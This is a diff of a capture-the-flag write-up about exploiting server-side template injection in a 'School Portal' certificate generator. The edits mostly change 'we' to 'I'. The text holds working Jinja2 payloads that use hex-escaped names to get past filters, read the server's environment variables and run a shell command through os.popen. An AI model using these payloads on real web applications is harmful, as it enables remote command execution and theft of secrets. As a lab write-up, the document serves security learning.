@@ -6,7 +6,6 @@ The School Portal challenge involves exploiting a Server-Side Template Injection
 ## Initial Reconnaissance
 
 ### Application Analysis
-Upon accessing the application, we discover a school portal system with the following features:
 - User registration and authentication
 - Dashboard functionality
 - Certificate generation system
@@ -29,7 +28,7 @@ The application includes a certificate generation feature that appears to accept
 *Certificate generation*
 
 ### SSTI Detection and Testing
-During testing of the certificate generation functionality, we started with a basic SSTI detection payload to see if the application processes user input through a template engine.
+During testing of the certificate generation functionality, I started with a basic SSTI detection payload to see if the application processes user input through a template engine.
 
 **Initial Test Payload:** `{{7*7}}`
 
@@ -44,7 +43,7 @@ The successful execution of the mathematical expression `{{7*7}}` returning `49`
 ## Exploitation Process
 
 ### Step 1: Environment Variable Enumeration
-Since CTF flags are commonly stored as environment variables, we crafted a payload to access the application's environment:
+Since we know that the flag is stored as an environment variable, I crafted a payload to access the application's environment:
 
 ```python
 {{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('environ')}}
@@ -63,7 +62,7 @@ Since CTF flags are commonly stored as environment variables, we crafted a paylo
 *Environment variable enumeration results showing available environment variables*
 
 ### Step 2: Flag Extraction Optimization
-The initial payload revealed environment variables but the flag output was truncated. To properly extract the complete flag, we refined our approach:
+The initial payload revealed environment variables but the flag output was truncated. To properly extract the complete flag, I refined my approach:
 
 ```python
 {{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('echo $FLAG_00_This_real | fold -w 50')|attr('read')()}}
